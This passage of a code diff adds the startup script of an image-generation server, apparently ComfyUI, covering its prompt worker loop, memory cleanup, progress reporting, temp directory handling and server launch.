+    device_name = comfy.model_management.get_torch_device_name(device)
+    cuda_malloc_warning = False
+    if "cudaMallocAsync" in device_name:
+        for b in cuda_malloc.blacklist:
+            if b in device_name:
+                cuda_malloc_warning = True
+        if cuda_malloc_warning:
+            logging.warning("\nWARNING: this card most likely does not support cuda-malloc, if you get \"CUDA error\" please run ComfyUI with: --disable-cuda-malloc\n")
+
+
+def prompt_worker(q, server_instance):
+    current_time: float = 0.0
+    cache_type = execution.CacheType.CLASSIC
+    if args.cache_lru > 0:
+        cache_type = execution.CacheType.LRU
+    elif args.cache_none:
+        cache_type = execution.CacheType.DEPENDENCY_AWARE
+
+    e = execution.PromptExecutor(server_instance, cache_type=cache_type, cache_size=args.cache_lru)
+    last_gc_collect = 0
+    need_gc = False
+    gc_collect_interval = 10.0
+
+    while True:
+        timeout = 1000.0
+        if need_gc:
+            timeout = max(gc_collect_interval - (current_time - last_gc_collect), 0.0)
+
+        queue_item = q.get(timeout=timeout)
+        if queue_item is not None:
+            item, item_id = queue_item
+            execution_start_time = time.perf_counter()
+            prompt_id = item[1]
+            server_instance.last_prompt_id = prompt_id
+
+            e.execute(item[2], prompt_id, item[3], item[4])
+            need_gc = True
+            q.task_done(item_id,
+                        e.history_result,
+                        status=execution.PromptQueue.ExecutionStatus(
+                            status_str='success' if e.success else 'error',
+                            completed=e.success,
+                            messages=e.status_messages))
+            if server_instance.client_id is not None:
+                server_instance.send_sync("executing", {"node": None, "prompt_id": prompt_id}, server_instance.client_id)
+
+            current_time = time.perf_counter()
+            execution_time = current_time - execution_start_time
+
+            # Log Time in a more readable way after 10 minutes
+            if execution_time > 600:
+                execution_time = time.strftime("%H:%M:%S", time.gmtime(execution_time))
+                logging.info(f"Prompt executed in {execution_time}")
+            else:
+                logging.info("Prompt executed in {:.2f} seconds".format(execution_time))
+
+        flags = q.get_flags()
+        free_memory = flags.get("free_memory", False)
+
+        if flags.get("unload_models", free_memory):
+            comfy.model_management.unload_all_models()
+            need_gc = True
+            last_gc_collect = 0
+
+        if free_memory:
+            e.reset()
+            need_gc = True
+            last_gc_collect = 0
+
+        if need_gc:
+            current_time = time.perf_counter()
+            if (current_time - last_gc_collect) > gc_collect_interval:
+                gc.collect()
+                comfy.model_management.soft_empty_cache()
+                last_gc_collect = current_time
+                need_gc = False
+                hook_breaker_ac10a0.restore_functions()
+
+
+async def run(server_instance, address='', port=8188, verbose=True, call_on_start=None):
+    addresses = []
+    for addr in address.split(","):
+        addresses.append((addr, port))
+    await asyncio.gather(
+        server_instance.start_multi_address(addresses, call_on_start, verbose), server_instance.publish_loop()
+    )
+
+def hijack_progress(server_instance):
+    def hook(value, total, preview_image, prompt_id=None, node_id=None):
+        executing_context = get_executing_context()
+        if prompt_id is None and executing_context is not None:
+            prompt_id = executing_context.prompt_id
+        if node_id is None and executing_context is not None:
+            node_id = executing_context.node_id
+        comfy.model_management.throw_exception_if_processing_interrupted()
+        if prompt_id is None:
+            prompt_id = server_instance.last_prompt_id
+        if node_id is None:
+            node_id = server_instance.last_node_id
+        progress = {"value": value, "max": total, "prompt_id": prompt_id, "node": node_id}
+        get_progress_state().update_progress(node_id, value, total, preview_image)
+
+        server_instance.send_sync("progress", progress, server_instance.client_id)
+        if preview_image is not None:
+            # Only send old method if client doesn't support preview metadata
+            if not feature_flags.supports_feature(
+                server_instance.sockets_metadata,
+                server_instance.client_id,
+                "supports_preview_metadata",
+            ):
+                server_instance.send_sync(
+                    BinaryEventTypes.UNENCODED_PREVIEW_IMAGE,
+                    preview_image,
+                    server_instance.client_id,
+                )
+
+    comfy.utils.set_progress_bar_global_hook(hook)
+
+
+def cleanup_temp():
+    temp_dir = folder_paths.get_temp_directory()
+    if os.path.exists(temp_dir):
+        shutil.rmtree(temp_dir, ignore_errors=True)
+
+
+def setup_database():
+    try:
+        from app.database.db import init_db, dependencies_available
+        if dependencies_available():
+            init_db()
+    except Exception as e:
+        logging.error(f"Failed to initialize database. Please ensure you have installed the latest requirements. If the error persists, please report this as in future the database will be required: {e}")
+
+
+def start_comfyui(asyncio_loop=None):
+    """
+    Starts the ComfyUI server using the provided asyncio event loop or creates a new one.
+    Returns the event loop, server instance, and a function to start the server asynchronously.
+    """
+    if args.temp_directory:
+        temp_dir = os.path.join(os.path.abspath(args.temp_directory), "temp")
+        logging.info(f"Setting temp directory to: {temp_dir}")
+        folder_paths.set_temp_directory(temp_dir)
+    cleanup_temp()
+
+    if args.windows_standalone_build:
+        try:
+            import new_updater
+            new_updater.update_windows_updater()
+        except:
+            pass
+
+    if not asyncio_loop:
+        asyncio_loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(asyncio_loop)
+    prompt_server = server.PromptServer(asyncio_loop)
+
+    hook_breaker_ac10a0.save_functions()
+    asyncio_loop.run_until_complete(nodes.init_extra_nodes(
+        init_custom_nodes=(not args.disable_all_custom_nodes) or len(args.whitelist_custom_nodes) > 0,
+        init_api_nodes=not args.disable_api_nodes
+    ))
+    hook_breaker_ac10a0.restore_functions()
+
+    cuda_malloc_warning()
+    setup_database()
+
+    prompt_server.add_routes()
+    hijack_progress(prompt_server)
+
+    threading.Thread(target=prompt_worker, daemon=True, args=(prompt_server.prompt_queue, prompt_server,)).start()
+
+    if args.quick_test_for_ci:
+        exit(0)
+
+    os.makedirs(folder_paths.get_temp_directory(), exist_ok=True)
+    call_on_start = None
+    if args.auto_launch:
+        def startup_server(scheme, address, port):
+            import webbrowser
+            if os.name == 'nt' and address == '0.0.0.0':
+                address = '127.0.0.1'
+            if ':' in address:
+                address = "[{}]".format(address)
+            webbrowser.open(f"{scheme}://{address}:{port}")
+        call_on_start = startup_server
+
+    async def start_all():
+        await prompt_server.setup()
+        await run(prompt_server, address=args.listen, port=args.port, verbose=not args.dont_print_server, call_on_start=call_on_start)
+
+    # Returning these so that other code can integrate with the ComfyUI loop and server
+    return asyncio_loop, prompt_server, start_all
+
+
+if __name__ == "__main__":
+    # Running directly, just start ComfyUI.
+    logging.info("Python version: {}".format(sys.version))
+    logging.info("ComfyUI version: {}".format(comfyui_version.__version__))
+
+    if sys.version_info.major == 3 and sys.version_info.minor < 10:
+        logging.warning("WARNING: You are using a python version older than 3.10, please upgrade to a newer one. 3.12 and above is recommended.")
+
+    event_loop, _, start_all_func = start_comfyui()
+    try:
+        x = start_all_func()
+        app.logger.print_startup_warnings()
+        event_loop.run_until_complete(x)
+    except KeyboardInterrupt:
+        logging.info("\nStopped server")
+
+    cleanup_temp()
